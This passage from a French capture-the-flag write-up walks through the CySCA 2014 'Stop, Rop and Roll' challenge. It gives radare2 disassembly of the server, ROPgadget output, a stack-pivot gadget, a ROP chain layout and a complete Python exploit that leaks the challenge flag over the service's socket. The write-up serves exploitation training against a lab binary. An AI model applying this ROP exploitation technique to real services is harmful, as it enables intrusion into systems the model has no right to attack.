|   |||    0x08049458    8b45f4       mov eax, dword [ebp - 0xc]
|   |||    0x0804945b    034508       add eax, dword [ebp + 8]
|   |||    0x0804945e    c60000       mov byte [eax], 0 ; strip()
|   ||     ; JMP XREF from 0x08049449 (unk)
|   ``---> 0x08049461    8b4508       mov eax, dword [ebp + 8] ; buffer
|     |    0x08049464    c745e4fffff. mov dword [ebp - 0x1c], 0xffffffff
|     |    0x0804946b    89c2         mov edx, eax
|     |    0x0804946d    b800000000   mov eax, 0
|     |    0x08049472    8b4de4       mov ecx, dword [ebp - 0x1c]
|     |    0x08049475    89d7         mov edi, edx
|     |    0x08049477    f2ae         repne scasb al, byte es:[edi]
|     |    0x08049479    89c8         mov eax, ecx
|     |    0x0804947b    f7d0         not eax
|     |    0x0804947d    83e801       sub eax, 1 ; valeur de retour : longueur du flag
|     `--> 0x08049480    83c434       add esp, 0x34
|          0x08049483    5f           pop edi
|          0x08049484    5d           pop ebp
\          0x08049485    c3           ret
```

On a ici une fonction *load\_flag* qui prend en argument le buffer de stockage du flag et sa longueur.  

Cette fonction n'étant utilisée nul part il va falloir que notre shellcode l'appelle lui même.  

Toute la gestion de la connexion est faite dans le fonction handle\_client :  

```asm
[0x08048e08]> pdf@sym.handle_client
/ (fcn) sym.sigAlarm 629
|          0x0804981b    55           push ebp
|          0x0804981c    89e5         mov ebp, esp
|          0x0804981e    83ec18       sub esp, 0x18
|          0x08049821    a150310f08   mov eax, dword [sym.g_client_socket]
|          0x08049826    c7442404a37. mov dword [esp + 4], str.Execution_timed_out_n
|          0x0804982e    890424       mov dword [esp], eax
|          0x08049831    e889faffff   call sym.socket_printf ; (loc.080492ac)
|             0x080492bf(unk) ; sym.socket_printf
|          0x08049836    c7042401000. mov dword [esp], 1
|          0x0804983d    e81e0f0000   call sym.exit
|             sym.exit()
|          ;-- sym.handle_client:
|          0x08049842    55           push ebp                                                                                                                                                                                               
|          0x08049843    89e5         mov ebp, esp
|          0x08049845    57           push edi
|          0x08049846    53           push ebx
|          0x08049847    81ecd0010000 sub esp, 0x1d0 ; 464
|          0x0804984d    65a114000000 mov eax, dword gs:[0x14] ; [:4]=0
|          0x08049853    8945f4       mov dword [ebp - 0xc], eax
|          0x08049856    31c0         xor eax, eax
|          0x08049858    8d9d74feffff lea ebx, dword [ebp - 0x18c]
|          0x0804985e    b800000000   mov eax, 0
|          0x08049863    ba40000000   mov edx, 0x40 ; '@'
|          0x08049868    89df         mov edi, ebx
|          0x0804986a    89d1         mov ecx, edx ; 64
|          0x0804986c    f3ab         rep stosd dword es:[edi], eax ; bzero(ebp-396, 54)
|          0x0804986e    8d9d74ffffff lea ebx, dword [ebp - 0x8c]
|          0x08049874    b800000000   mov eax, 0
|          0x08049879    ba20000000   mov edx, 0x20
|          0x0804987e    89df         mov edi, ebx
|          0x08049880    89d1         mov ecx, edx
|          0x08049882    f3ab         rep stosd dword es:[edi], eax ; bzero(ebp-140, 32)
|          0x08049884    8b4508       mov eax, dword [ebp + 8] ; [:4]=0
|          0x08049887    a350310f08   mov dword [sym.g_client_socket], eax ;
|          0x0804988c    c7442404b87. mov dword [esp + 4], str.Welcome_to_the_shellcode_3_challenge_n
|          0x08049894    8b4508       mov eax, dword [ebp + 8] ; [:4]=0
|          0x08049897    890424       mov dword [esp], eax
|          0x0804989a    e820faffff   call sym.socket_printf ; (loc.080492ac)
|             0x080492bf(unk, unk, unk) ; sym.socket_printf
|          0x0804989f    c7442404e07. mov dword [esp + 4], str.Please_send_your_all_requested_data_as_hex_encoded_strings_n
|          0x080498a7    8b4508       mov eax, dword [ebp + 8] ; socket
|          0x080498aa    890424       mov dword [esp], eax
|          0x080498ad    e80dfaffff   call sym.socket_printf ; (loc.080492ac)
|             0x080492bf() ; sym.socket_printf
|          0x080498b2    c74424041c7. mov dword [esp + 4], str.DEP_is_on__n ; [:4]=0x3010100
|          0x080498ba    8b4508       mov eax, dword [ebp + 8] ; [:4]=0
|          0x080498bd    890424       mov dword [esp], eax
|          0x080498c0    e8faf9ffff   call sym.socket_printf ; (loc.080492ac)
|             0x080492bf() ; sym.socket_printf
|          0x080498c5    c7442404287. mov dword [esp + 4], str.Payload_Conditions__Truncated_at_zero._Every_16th_byte_must_be_0xCC_n
|          0x080498cd    8b4508       mov eax, dword [ebp + 8] ; [:4]=0
|          0x080498d0    890424       mov dword [esp], eax
|          0x080498d3    e8e7f9ffff   call sym.socket_printf ; (loc.080492ac)
|             0x080492bf() ; sym.socket_printf
|          0x080498d8    c7442404707. mov dword [esp + 4], str.Pivot_and_ROP_conditions__None_apart_from_size_n
|          0x080498e0    8b4508       mov eax, dword [ebp + 8] ; [:4]=0
|          0x080498e3    890424       mov dword [esp], eax
|          0x080498e6    e8d4f9ffff   call sym.socket_printf ; (loc.080492ac)
|             0x080492bf() ; sym.socket_printf
|          0x080498eb    c7442414000. mov dword [esp + 0x14], 0 ; offset=0
|          0x080498f3    c7442410fff. mov dword [esp + 0x10], 0xffffffff ; fd=-1
|          0x080498fb    c744240c220. mov dword [esp + 0xc], 0x22 ; flags MAP_ANONYMOUS|MAP_PRIVATE
|          0x08049903    c7442408030. mov dword [esp + 8], 3 ; protection PROT_READ|PROT_WRITE
|          0x0804990b    c7442404000. mov dword [esp + 4], 0x100
|          0x08049913    c7042400000. mov dword [esp], 0
|          0x0804991a    e851a70100   call sym.mmap ; allocation de 256 octets, adresse choisie par le kernel
|             sym.__open_nocancel() ; sym.__mmap
|          0x0804991f    89856cfeffff mov dword [ebp - 0x194], eax
|          0x08049925    83bd6cfefff. cmp dword [ebp - 0x194], 0
|      ,=< 0x0804992c    751f         jne 0x804994d
|      |   0x0804992e    c7442404a07. mov dword [esp + 4], str.ERROR__Unable_to_allocate_payload_space_n
|      |   0x08049936    8b4508       mov eax, dword [ebp + 8] ; [:4]=0
|      |   0x08049939    890424       mov dword [esp], eax
|      |   0x0804993c    e87ef9ffff   call sym.socket_printf ; (loc.080492ac)
|      |      0x080492bf() ; sym.socket_printf
|      |   0x08049941    c7042401000. mov dword [esp], 1
|      |   0x08049948    e8130e0000   call sym.exit
|      |      sym.exit()
|      |   ; JMP XREF from 0x0804992c (unk)
|      `-> 0x0804994d    8b856cfeffff mov eax, dword [ebp - 0x194]
|          0x08049953    89442408     mov dword [esp + 8], eax ; adresse payload
|          0x08049957    c7442404cc7. mov dword [esp + 4], str.Your_payload_will_be_located_at_0x_08x_n
|          0x0804995f    8b4508       mov eax, dword [ebp + 8] ; [:4]=0
|          0x08049962    890424       mov dword [esp], eax
|          0x08049965    e855f9ffff   call sym.socket_printf ; (loc.080492ac)
|             0x080492bf() ; sym.socket_printf
|          0x0804996a    c7442408080. mov dword [esp + 8], 8 ; [:4]=0
|          0x08049972    c7442404f47. mov dword [esp + 4], str.Please_send_your_pivot___d_characters__n
|          0x0804997a    8b4508       mov eax, dword [ebp + 8] ; [:4]=0
|          0x0804997d    890424       mov dword [esp], eax
|          0x08049980    e83af9ffff   call sym.socket_printf ; (loc.080492ac)
|             0x080492bf() ; sym.socket_printf
|          0x08049985    c7442408040. mov dword [esp + 8], 4 ; taille pivot
|          0x0804998d    8d8564feffff lea eax, dword [ebp - 0x19c] ; buffer pour le pivot
|          0x08049993    89442404     mov dword [esp + 4], eax
|          0x08049997    8b4508       mov eax, dword [ebp + 8]
|          0x0804999a    890424       mov dword [esp], eax
|          0x0804999d    e856fcffff   call sym.sc_recv_shellcode
|             sym.sc_recv_shellcode()
|          0x080499a2    898570feffff mov dword [ebp - 0x190], eax
|          0x080499a8    83bd70fefff. cmp dword [ebp - 0x190], 0
|     ,==< 0x080499af    7f29         jg 0x80499da
|     |    0x080499b1    8b8570feffff mov eax, dword [ebp - 0x190]
|     |    0x080499b7    89442408     mov dword [esp + 8], eax
|     |    0x080499bb    c74424041c7. mov dword [esp + 4], str.ERROR__Error_occurred_when_receiving_pivot.__d_n
|     |    0x080499c3    8b4508       mov eax, dword [ebp + 8]
|     |    0x080499c6    890424       mov dword [esp], eax
|     |    0x080499c9    e8f1f8ffff   call sym.socket_printf ; (loc.080492ac)
|     |       0x080492bf() ; sym.socket_printf
|     |    0x080499ce    c7042401000. mov dword [esp], 1
|     |    0x080499d5    e8860d0000   call sym.exit
|     |       sym.exit()
|     |    ; JMP XREF from 0x080499af (unk)
|     `--> 0x080499da    83bd70fefff. cmp dword [ebp - 0x190], 4
|    ,===< 0x080499e1    7431         je 0x8049a14
|    |     0x080499e3    8b8570feffff mov eax, dword [ebp - 0x190]
|    |     0x080499e9    8944240c     mov dword [esp + 0xc], eax ; [:4]=0
|    |     0x080499ed    c7442408040. mov dword [esp + 8], 4 ; [:4]=0
|    |     0x080499f5    c74424044c7. mov dword [esp + 4], str.Sorry._Bad_pivot_size._Expected__d_bytes_received__d._Bye_n
|    |     0x080499fd    8b4508       mov eax, dword [ebp + 8] ; [:4]=0
|    |     0x08049a00    890424       mov dword [esp], eax
|    |     0x08049a03    e8b7f8ffff   call sym.socket_printf ; (loc.080492ac)
|    |        0x080492bf() ; sym.socket_printf
|    |     0x08049a08    c7042401000. mov dword [esp], 1
|    |     0x08049a0f    e84c0d0000   call sym.exit
|    |        sym.exit()
|    |     ; JMP XREF from 0x080499e1 (unk)
|    `---> 0x08049a14    c7442408000. mov dword [esp + 8], 0x200 ; 512
|          0x08049a1c    c7442404887. mov dword [esp + 4], str.Please_send_your_payload__upto__d_characters__n
|          0x08049a24    8b4508       mov eax, dword [ebp + 8] ; socket
|          0x08049a27    890424       mov dword [esp], eax
|          0x08049a2a    e890f8ffff   call sym.socket_printf ; (loc.080492ac)
|             0x080492bf() ; sym.socket_printf
|          0x08049a2f    c7442408000. mov dword [esp + 8], 0x100 ; 256
|          0x08049a37    8d8574feffff lea eax, dword [ebp - 0x18c] ; payload buffer, rempli de nulls
|          0x08049a3d    89442404     mov dword [esp + 4], eax
|          0x08049a41    8b4508       mov eax, dword [ebp + 8]
|          0x08049a44    890424       mov dword [esp], eax
|          0x08049a47    e8acfbffff   call sym.sc_recv_shellcode
|             sym.sc_recv_shellcode()
|          0x08049a4c    898570feffff mov dword [ebp - 0x190], eax
|          0x08049a52    83bd70fefff. cmp dword [ebp - 0x190], 0
|   ,====< 0x08049a59    7f29         jg 0x8049a84
|   |      0x08049a5b    8b8570feffff mov eax, dword [ebp - 0x190]
|   |      0x08049a61    89442408     mov dword [esp + 8], eax ; [:4]=0
|   |      0x08049a65    c7442404b87. mov dword [esp + 4], str.ERROR__Error_occurred_when_receiving_payload.__d_n
|   |      0x08049a6d    8b4508       mov eax, dword [ebp + 8] ; [:4]=0
|   |      0x08049a70    890424       mov dword [esp], eax
|   |      0x08049a73    e847f8ffff   call sym.socket_printf ; (loc.080492ac)
|   |         0x080492bf() ; sym.socket_printf
|   |      0x08049a78    c7042401000. mov dword [esp], 1
|   |      0x08049a7f    e8dc0c0000   call sym.exit
|   |         sym.exit()
|   |      ; JMP XREF from 0x08049a59 (unk)
|   `----> 0x08049a84    c78568fefff. mov dword [ebp - 0x198], 0x10 ; 16
\          0x08049a8e    eb39         jmp fcn.08049ac9
```

Et la suite :  

```asm
[0x08048e08]> pdf@0x08049ac9
           ; JMP XREF from 0x08049ad5 (fcn.08049a90)
/ (fcn) fcn.08049a90 390
|     .--> 0x08049a90    8d8574feffff lea eax, dword [ebp - 0x18c]
|     |    0x08049a96    038568feffff add eax, dword [ebp - 0x198]
|     |    0x08049a9c    0fb600       movzx eax, byte [eax]
|     |    0x08049a9f    3ccc         cmp al, -0x34
|     |,=< 0x08049aa1    741f         je 0x8049ac2
|     ||   0x08049aa3    c7442404ec7. mov dword [esp + 4], str.Sorry._Payload_conditions_aren_t_met_n
|     ||   0x08049aab    8b4508       mov eax, dword [ebp + 8] ; [:4]=0
|     ||   0x08049aae    890424       mov dword [esp], eax
|     ||   0x08049ab1    e809f8ffff   call sym.socket_printf ; (loc.080492ac)
|     ||      0x080492bf() ; sym.socket_printf
|     ||   ; JMP XREF from 0x08049aa8 (fcn.08049a90)
|     ||   0x08049ab6    c7042401000. mov dword [esp], 1
|     ||   0x08049abd    e89e0c0000   call sym.exit
|     ||      sym.exit()
|     ||   ; JMP XREF from 0x08049aa1 (fcn.08049a90)
|     |`-> 0x08049ac2    838568fefff. add dword [ebp - 0x198], 0x10
|     |    ; JMP XREF from 0x08049a8e (unk)
|- fcn.08049ac9 333
|     |    0x08049ac9    8b8568feffff mov eax, dword [ebp - 0x198]
|     |    0x08049acf    3b8570feffff cmp eax, dword [ebp - 0x190]
|     `==< 0x08049ad5    7cb9         jl fcn.08049a90
|          0x08049ad7    8d8574feffff lea eax, dword [ebp - 0x18c]
|          0x08049add    c7442408ff0. mov dword [esp + 8], 0xff ; [:4]=0
|          0x08049ae5    89442404     mov dword [esp + 4], eax ; [:4]=0x3010100
|          0x08049ae9    8b856cfeffff mov eax, dword [ebp - 0x194]
|          0x08049aef    890424       mov dword [esp], eax
|          0x08049af2    e889e7ffff   call fcn.08048280 ; uh ?
|             fcn.08048280()
|          0x08049af7    8d8574feffff lea eax, dword [ebp - 0x18c]
|          0x08049afd    89c3         mov ebx, eax
|          0x08049aff    b800000000   mov eax, 0
|          0x08049b04    ba40000000   mov edx, 0x40 ; 64
|          0x08049b09    89df         mov edi, ebx
|          0x08049b0b    89d1         mov ecx, edx
|          0x08049b0d    f3ab         rep stosd dword es:[edi], eax
|          0x08049b0f    8b856cfeffff mov eax, dword [ebp - 0x194]
|          0x08049b15    c78554fefff. mov dword [ebp - 0x1ac], 0xffffffff
|          0x08049b1f    89c2         mov edx, eax
|          0x08049b21    b800000000   mov eax, 0
|          0x08049b26    8b8d54feffff mov ecx, dword [ebp - 0x1ac]
|          0x08049b2c    89d7         mov edi, edx
|          0x08049b2e    f2ae         repne scasb al, byte es:[edi]
|          0x08049b30    89c8         mov eax, ecx
|          0x08049b32    f7d0         not eax
|          0x08049b34    83e801       sub eax, 1
|          0x08049b37    89442408     mov dword [esp + 8], eax ; [:4]=0
|          0x08049b3b    c7442404127. mov dword [esp + 4], str.Received__d_bytes_of_payload_n
|          0x08049b43    8b4508       mov eax, dword [ebp + 8] ; [:4]=0
|          0x08049b46    890424       mov dword [esp], eax
|          0x08049b49    e871f7ffff   call sym.socket_printf ; (loc.080492ac)
|             0x080492bf() ; sym.socket_printf
|          0x08049b4e    c7442408000. mov dword [esp + 8], 0x100 ; 256
|          0x08049b56    c7442404307. mov dword [esp + 4], str.Please_send_your_rop_chain__upto__d_characters__n
|          0x08049b5e    8b4508       mov eax, dword [ebp + 8] ; [:4]=0
|          0x08049b61    890424       mov dword [esp], eax
|          0x08049b64    e856f7ffff   call sym.socket_printf ; (loc.080492ac)
|             0x080492bf() ; sym.socket_printf
|          0x08049b69    c7442408800. mov dword [esp + 8], 0x80 ; 128 = length
|          0x08049b71    8d8574ffffff lea eax, dword [ebp - 0x8c] ; buffer rop-chain
|          0x08049b77    89442404     mov dword [esp + 4], eax ;
|          0x08049b7b    8b4508       mov eax, dword [ebp + 8] ; socket
|          0x08049b7e    890424       mov dword [esp], eax
|          0x08049b81    e872faffff   call sym.sc_recv_shellcode
|             sym.sc_recv_shellcode()
|          0x08049b86    898570feffff mov dword [ebp - 0x190], eax
|          0x08049b8c    83bd70fefff. cmp dword [ebp - 0x190], 0
|    ,===< 0x08049b93    7f29         jg 0x8049bbe
|    |     0x08049b95    8b8570feffff mov eax, dword [ebp - 0x190]
|    |     0x08049b9b    89442408     mov dword [esp + 8], eax ; [:4]=0
|    |     0x08049b9f    c7442404647. mov dword [esp + 4], str.ERROR__Error_occurred_when_receiving_rop_chain.__d_n
|    |     0x08049ba7    8b4508       mov eax, dword [ebp + 8] ; [:4]=0
|    |     0x08049baa    890424       mov dword [esp], eax
|    |     0x08049bad    e80df7ffff   call sym.socket_printf ; (loc.080492ac)
|    |        0x080492bf() ; sym.socket_printf
|    |     0x08049bb2    c7042401000. mov dword [esp], 1
|    |     0x08049bb9    e8a20b0000   call sym.exit
|    |        sym.exit()
|    |     ; JMP XREF from 0x08049b93 (fcn.08049a90)
|    `---> 0x08049bbe    8b8570feffff mov eax, dword [ebp - 0x190]
|          0x08049bc4    89442408     mov dword [esp + 8], eax ; [:4]=0
|          0x08049bc8    c7442404987. mov dword [esp + 4], str.Received__d_bytes_of_rop_chain_n
|          0x08049bd0    8b4508       mov eax, dword [ebp + 8] ; [:4]=0
|          0x08049bd3    890424       mov dword [esp], eax
|          0x08049bd6    e8e4f6ffff   call sym.socket_printf ; (loc.080492ac)
|             0x080492bf() ; sym.socket_printf
|          0x08049bdb    c74424041b9. mov dword [esp + 4], sym.sigAlarm
|          0x08049be3    c704240e000. mov dword [esp], 0xe
|          0x08049bea    e821080000   call sym.signal
|             sym.signal() ; sym.__bsd_signal
|          0x08049bef    c704240a000. mov dword [esp], 0xa
|          0x08049bf6    e8a5920100   call sym.alarm
|             sym.alarm()
|          0x08049bfb    8b4508       mov eax, dword [ebp + 8]
|          0x08049bfe    890424       mov dword [esp], eax
|          0x08049c01    e86af9ffff   call sym.sc_setup_handlers ; (sym.sc_sigillHandler)
|             sym.sc_sigillHandler() ; sym.sc_setup_handlers
|          0x08049c06    8b9564feffff mov edx, dword [ebp - 0x19c] ; pivot
|          0x08049c0c    8d8574ffffff lea eax, dword [ebp - 0x8c] ; ROP-chain
|          0x08049c12    89d1         mov ecx, edx
|          0x08049c14    51           push ecx
\          0x08049c15    c3           ret  ; jump vers pivot
```

On en apprend ainsi beaucoup plus sur le contexte d'exécution.  

Ce qu'on retiendra :  

* L'adresse de notre rop-chain est stockée dans eax. Il faut trouver un gadget (le pivot) qui permettra par exemple d'échanger eax et esp.
* Le serveur nous autorise 32 entrées dans la ROP chain ce qui semble beaucoup. Il n'y pas de restrictions sur le contenu donc c'est positif.
* On voit des appels aux fonctions custom *socket\_printf(int sock, char \* s)* et *sc\_recv\_shellcode* qui pourraient nous aider. Mais comme vu dans le code l'espace alloué pour le payload n'est pas exécutable et de plus il faudrait connaître le descripteur de la socket.

Pour trouver des ROPs dans l'exécutable j'ai eu recours à l'outil [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) écrit sur Python et basé entre autres sur [Capstone](http://www.capstone-engine.org/). Il suffit de lui spécifier le binaire via le paramètre binary :  

```plain
$ ./ROPgadget.py --binary 8305f5c99ba1d89802940f6e68f802f5-sc03
```

Rapidement j'ai trouvé un gadget de choix pour le pivot :  

```plain
0x080511ec : xchg eax, esp ; ret
```

J'ai fait une première esquisse de ma rop-chain de cette manière selon mon objectif :  

```plain
----- top -----

arg2 : adresse de payload (qui sert de buffer d'écriture)
arg1 : socket client
gargage
@socket_printf
arg2 : longueur 32, choisi au feeling
arg1 : adresse du buffer payload
@gadget_clear_args (pop-pop-ret)
@load_flag

--- bottom ---
```

Je représente toujours la stack avec les adresses hautes en haut (voir le contraire m'énerve).  

Par conséquent le programme va d'abord appeler *load\_flag* puis remontera en dépilant les adresses.  

Comme *load\_flag* prend deux arguments, le second appel devra être un gadget capable de dépiler deux dword de la pile avant de faire un ret.  

On trouve de nombreux gadgets en pop-pop-ret mais j'ai choisi le suivant :  

```plain
0x0804c3ea : pop ebx ; pop esi ; ret
```

Il ne reste plus qu'un problème (mais de taille) : récupérer le descripteur de la socket que l'on doit passer en argument à socket\_printf.  

Quand on analyse attentivement la fonction *handle\_client* on remarque que *socket\_printf* est appelé plusieurs fois avec une socket qui provient de ebp+8.  

On a beau passer par *load\_flag* dans notre ROP-chain, ebp n'est pas modifié dans le sens ou le prologue de la fonction le change mais l'épilogue le rétabli.  

Quand à notre gadget il ne touche pas ebp par conséquent le descripteur est toujours à l'adresse ebp+8.  

J'ai trouvé un gadget fort sympathique qui placera ainsi la socket dans le registre eax avant de la placer dans la pile où il faut :  

```plain
0x080c6569 : mov eax, dword ptr [ebp + 8] ; add eax, ebx ; mov dword ptr [esp], eax ; call esi
```

Deux inconvénients :  

* il faut que ebx soit à zéro sinon le descripteur de la socket sera modifié.
* il faut que l'adresse de socket\_printf soit dans esi en raison du call final.

Si j'ai choisi précédemment un *pop ebx; pop esi; ret* parmi les pop-pop-ret existants c'est pour une raison ;-)  

Ainsi notre rop-chain aura ce look :  

```plain
----- top -----

adresse payload (pour etre sur)
adresse payload
@gadget_put_socket_stack_and_call_esi
adresse socket_printf pour esi
0 pour ebx
@gadget_pop_ebx_esi
arg2 : len = 32
arg1 : adresse de payload
@gadget_pop_ebx_esi
@load_flag

--- bottom ---
```

J'ai placé deux fois l'adresse du payload à la fin parce que j'ai du mal à m'y retrouver avec tous ces rets et calls ;-)  

Et avec les valeurs :  

```plain
----- top -----

adresse payload
adresse payload
0x080c6569 : set sockfd on stack, call esi
0x080492bf : @socket_printf
0
0x0804c3ea : @pop 0 pop socket_printf ret
32
@payload
0x0804c3ea : @pop pop ret
0x080493cc : @load_flag

--- bottom ---
```

J'ai écrit l'exploit suivant :  

```python
#!/usr/bin/python2                                                                                                                                                                                                                           
# devloop - CySCA 2014 Stop, Rop and Roll CTF exploit                                                                                                                                                                                        
import socket                                                                                                                                                                                                                                
import struct                                                                                                                                                                                                                                
import re                                                                                                                                                                                                                                    

def read_while(sock_fd, marker):                                                                                                                                                                                                             
    buffer = ""                                                                                                                                                                                                                              
    while True:                                                                                                                                                                                                                              
        buffer += sock_fd.recv(1024)                                                                                                                                                                                                         
        if marker in buffer:                                                                                                                                                                                                                 
            break
    return buffer

def send_hex(sock_fd, data):
    sock_fd.send(data.encode("hex_codec"))

pivot = 0x080511ec
load_flag = 0x080493cc
pop_ebx_esi = 0x0804c3ea
socket_printf = 0x080492bf
get_sock_call_esi = 0x080c6569

sock = socket.socket()
sock.connect(('192.168.1.64', 22523))

s = read_while(sock, "Your payload will be located at ").strip()
payload = re.search(r'0x([0-9a-f]{8})', s).group(1)
print "Payload addr is", payload
payload = struct.unpack(">I", payload.decode("hex_codec"))[0]

read_while(sock, "Please send your pivot (8 characters)")
send_hex(sock, struct.pack('<I', pivot))

read_while(sock, "Please send your payload (upto 512 characters)")
sock.send("cc" * 128)

read_while(sock, "Please send your rop chain (upto 256 characters)")

chain = struct.pack("<I", load_flag)
chain += struct.pack("<I", pop_ebx_esi)
chain += struct.pack("<I", payload)
chain += struct.pack("<I", 32)
chain += struct.pack("<I", pop_ebx_esi)
chain += struct.pack("<I", 0)
chain += struct.pack("<I", socket_printf)
chain += struct.pack("<I", get_sock_call_esi)
chain += struct.pack("<I", payload)
chain += struct.pack("<I", payload)

send_hex(sock, chain)
sock.recv(1024)
buff = sock.recv(1024)
print "Received", buff

sock.close()
```

Et à la première exécution (Yes !) :  

```plain
$ ./rop.py 
Payload addr is b7731000
Received RoofTitleSuspicious854A SIGSEGV was raised during shellcode execution. Exiting
```

La solution donné par les organisateurs est plus compliquée : faire un ROP chain qui appelle [mprotect()](http://linux.die.net/man/2/mprotect) pour rendre la zone mémoire du payload exécutable pour sauter dessus.  


*Published May 12 2015 at 14:08*